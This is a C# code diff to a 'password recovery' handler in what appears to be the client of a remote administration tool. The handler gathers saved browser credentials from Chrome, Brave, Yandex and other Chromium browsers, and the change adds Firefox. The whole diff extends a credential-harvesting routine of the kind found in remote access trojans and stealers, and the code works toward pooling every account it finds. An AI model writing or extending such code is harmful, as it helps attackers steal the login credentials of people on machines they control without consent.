@@ -13,7 +13,9 @@ namespace RemoteAdmin.Client.Handlers
             Console.WriteLine("Starting password recovery...");
 
             var allAccounts = new List<RecoveredAccount>();
-            var browsers = new List<Recovery.Browsers.ChromiumBase>
+
+            // Chromium-based browsers
+            var chromiumBrowsers = new List<Recovery.Browsers.ChromiumBase>
             {
                 new Recovery.Browsers.ChromePassReader(),
                 new Recovery.Browsers.BravePassReader(),
@@ -23,7 +25,8 @@ namespace RemoteAdmin.Client.Handlers
                 new Recovery.Browsers.YandexPassReader()
             };
 
-            foreach (var browser in browsers)
+            // Process Chromium-based browsers
+            foreach (var browser in chromiumBrowsers)
             {
                 try
                 {
@@ -45,6 +48,42 @@ namespace RemoteAdmin.Client.Handlers
                     Console.WriteLine($"Error reading accounts from {browser.ApplicationName}: {ex.Message}");
                     // Continue with next browser even if one fails
                 }
+            }
+
+            // Process Firefox (separate because it doesn't inherit from ChromiumBase)
+            try
+            {
+                Console.WriteLine("Recovering passwords from Firefox...");
+                var firefoxReader = new Recovery.Browsers.FirefoxPassReader();
+                var firefoxAccounts = firefoxReader.ReadAccounts();
+
+                if (firefoxAccounts != null)
+                {
+                    int firefoxCount = 0;
+                    foreach (var account in firefoxAccounts)
+                    {
+                        allAccounts.Add(account);
+                        firefoxCount++;
+                    }
+
+                    if (firefoxCount > 0)
+                    {
+                        Console.WriteLine($"Successfully recovered {firefoxCount} passwords from Firefox");
+                    }
+                    else
+                    {
+                        Console.WriteLine("No passwords found in Firefox");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("No passwords found in Firefox");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error reading accounts from Firefox: {ex.Message}");
+                // Continue even if Firefox fails
             }
 
             Console.WriteLine($"Password recovery completed. Found {allAccounts.Count} accounts total.");
